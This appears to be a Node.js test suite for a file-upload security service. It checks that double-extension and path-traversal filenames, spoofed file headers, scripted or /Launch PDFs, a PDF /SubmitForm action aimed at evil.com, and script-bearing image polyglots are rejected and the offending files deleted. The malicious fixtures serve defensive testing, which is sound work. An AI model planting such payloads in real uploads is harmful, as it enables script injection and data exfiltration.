import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import {
  validateFileName,
  verifyMagicBytes,
  scanPdfForScripts,
  scanImageForActiveContent,
  securityCheckUploadedFile,
} from "../services/fileSecurity.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const tempTestDir = path.join(__dirname, "../temp_test_sec_comprehensive");

if (!fs.existsSync(tempTestDir)) {
  fs.mkdirSync(tempTestDir, { recursive: true });
}

let passed = 0;
let failed = 0;

function assert(condition, message) {
  if (condition) {
    console.log(`  ✅ PASS: ${message}`);
    passed++;
  } else {
    console.error(`  ❌ FAIL: ${message}`);
    failed++;
  }
}

console.log("=== COMPREHENSIVE FILE SECURITY DEFENSE TEST SUITE ===\n");

// 1. Filename policy & double extension tests
console.log("Suite 1: Filename Policy & Double-Extension Evasion");
assert(
  validateFileName("clean_document.pdf", [".pdf", ".jpg"]).valid === true,
  "Accepts valid filename with permitted extension"
);
assert(
  validateFileName("document.php.pdf", [".pdf", ".jpg"]).valid === false,
  "Rejects double-extension with intermediate script (.php.pdf)"
);
assert(
  validateFileName("image.exe.png", [".png", ".jpg"]).valid === false,
  "Rejects double-extension with intermediate executable (.exe.png)"
);
assert(
  validateFileName("../../secret.pdf", [".pdf"]).valid === false,
  "Rejects path traversal in filename"
);
assert(
  validateFileName("report.pdf\0.jpg", [".jpg"]).valid === false,
  "Rejects null-byte in filename"
);
assert(
  validateFileName("archive.zip", [".pdf", ".jpg"]).valid === false,
  "Rejects extension not in allowedExtensions whitelist"
);

// 2. Binary signature (Magic Bytes) tests
console.log("\nSuite 2: Binary File Header (Magic Bytes) Verification");
const cleanPdfBuffer = Buffer.from(
  "%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\nxref\n0 4\ntrailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n190\n%%EOF"
);
assert(verifyMagicBytes(cleanPdfBuffer, ".pdf").valid === true, "Verifies genuine %PDF- header");

const spoofedPdfBuffer = Buffer.from("<!DOCTYPE html><html><head><script>alert(1)</script></head><body>Fake</body></html>");
assert(verifyMagicBytes(spoofedPdfBuffer, ".pdf").valid === false, "Rejects HTML file disguised as .pdf");

const fakePngBuffer = Buffer.from("echo 'hacked' > /dev/null");
assert(verifyMagicBytes(fakePngBuffer, ".png").valid === false, "Rejects shell script disguised as .png");

// 3. PDF Active Script & Action Hook Scanning
console.log("\nSuite 3: PDF Active Content, JavaScript, & Action Dictionaries");
const cleanScan = scanPdfForScripts(cleanPdfBuffer);
assert(cleanScan.safe === true, "Approves clean PDF without scripts");

const jsPdfBuffer = Buffer.from("%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Names << /JavaScript 4 0 R >> >>\nendobj\n4 0 obj\n<< /Names [(Test) 5 0 R] >>\nendobj\n5 0 obj\n<< /S /JavaScript /JS (app.alert('XSS');) >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF");
const jsScan = scanPdfForScripts(jsPdfBuffer);
assert(jsScan.safe === false, "Flags PDF with /JavaScript and /JS dictionaries");

const launchPdfBuffer = Buffer.from("%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n3 0 obj\n<< /Type /Action /S /Launch /F (calc.exe) >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF");
assert(scanPdfForScripts(launchPdfBuffer).safe === false, "Flags PDF with /Launch OS command trigger");

const richMediaPdfBuffer = Buffer.from("%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n3 0 obj\n<< /Type /RichMedia /Subtype /Flash >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF");
assert(scanPdfForScripts(richMediaPdfBuffer).safe === false, "Flags PDF with /RichMedia executable payload");

const submitFormPdfBuffer = Buffer.from("%PDF-1.4\n1 0 obj\n<< /Type /Action /S /SubmitForm /F (http://evil.com) >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF");
assert(scanPdfForScripts(submitFormPdfBuffer).safe === false, "Flags PDF with /SubmitForm exfiltration hook");

// 4. Image Polyglot Script Detection
console.log("\nSuite 4: Image Polyglot Script Injection Detection");
const cleanPngHeader = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d]);
assert(scanImageForActiveContent(cleanPngHeader).safe === true, "Clean image buffer passes scan");

const polyglotPngBuffer = Buffer.concat([
  cleanPngHeader,
  Buffer.from("some binary pixel data <script>alert('xss')</script> end of chunk"),
]);
assert(scanImageForActiveContent(polyglotPngBuffer).safe === false, "Detects and flags embedded <script> in image buffer");

// 5. End-to-End Quarantine & Disk Cleanup
console.log("\nSuite 5: End-to-End File Quarantine Verification");
const threatPath = path.join(tempTestDir, "malicious_upload.pdf");
fs.writeFileSync(threatPath, jsPdfBuffer);
assert(fs.existsSync(threatPath), "Test threat file written to disk");

const result = securityCheckUploadedFile(threatPath, "zoning_form.pdf", "application/pdf", [".pdf", ".jpg"]);
assert(result.ok === false, "Security check returns failure for malicious PDF");
assert(result.code === "FILE_SECURITY_VIOLATION", "Violation code set correctly");
assert(!fs.existsSync(threatPath), "Malicious file was immediately erased from disk");

// Cleanup temp test directory
try {
  fs.rmdirSync(tempTestDir);
} catch (_) {}

console.log(`\n=== RESULTS: ${passed} PASSED, ${failed} FAILED ===\n`);
if (failed > 0) {
  process.exit(1);
} else {
  process.exit(0);
}
